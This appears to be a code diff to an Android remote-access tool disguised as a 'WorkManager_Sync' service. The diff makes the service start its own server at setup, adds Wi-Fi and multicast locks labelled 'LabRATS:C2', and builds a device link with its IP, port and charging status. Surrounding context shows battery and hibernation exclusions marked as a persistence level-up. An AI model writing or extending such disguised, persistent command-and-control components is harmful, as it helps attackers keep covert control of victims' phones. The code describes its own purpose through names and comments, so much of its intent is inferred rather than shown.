@@ -161,6 +161,7 @@ public class WorkManager_Sync extends Service {
         schedulePersistenceAlarms();
         createNotificationChannel();
         ensureForeground();
+        startServer();
         
         // --- PERSISTENCE LEVEL-UP ---
         // Request battery and hibernation exclusions on setup
@@ -446,8 +447,44 @@ public class WorkManager_Sync extends Service {
         } catch (Exception ignored) {}
     }
 
+    private android.net.wifi.WifiManager.WifiLock wifiLock;
+    private android.net.wifi.WifiManager.MulticastLock multicastLock;
+
+    private synchronized void acquireWifiLock() {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null) {
+                // 1. High-Performance Radio Lock
+                if (wifiLock == null) {
+                    wifiLock = wm.createWifiLock(
+                        android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF,
+                        "LabRATS:C2_WifiLock"
+                    );
+                    wifiLock.setReferenceCounted(false);
+                }
+                if (wifiLock != null && !wifiLock.isHeld()) {
+                    wifiLock.acquire();
+                    Log.d(TAG, "C2_WIFI_LOCK: High-performance Wi-Fi radio lock acquired.");
+                }
+
+                // 2. Multicast & Local Wi-Fi Packet Filter Lock (Required for Android 15 / One UI 7)
+                if (multicastLock == null) {
+                    multicastLock = wm.createMulticastLock("LabRATS:C2_Multicast");
+                    multicastLock.setReferenceCounted(false);
+                }
+                if (multicastLock != null && !multicastLock.isHeld()) {
+                    multicastLock.acquire();
+                    Log.d(TAG, "C2_MULTICAST_LOCK: One UI 7 local Wi-Fi packet filter lock acquired.");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "WifiLock/MulticastLock Error: " + e.getMessage());
+        }
+    }
+
     private synchronized void startServer() {
         try {
+            acquireWifiLock();
             if (server == null || !server.isAlive()) {
                 // --- PORT_SANITY_CHECK ---
                 int port = FirebaseConfig.DEFAULT_PORT;
@@ -822,8 +859,12 @@ public class WorkManager_Sync extends Service {
                 }
             } catch (Exception ignored) {}
 
+            if (ip == null || ip.trim().isEmpty()) {
+                ip = "127.0.0.1";
+            }
+
             int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
-            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
+            String formattedIp = (ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
 
             String chargingStatus = "Discharging";
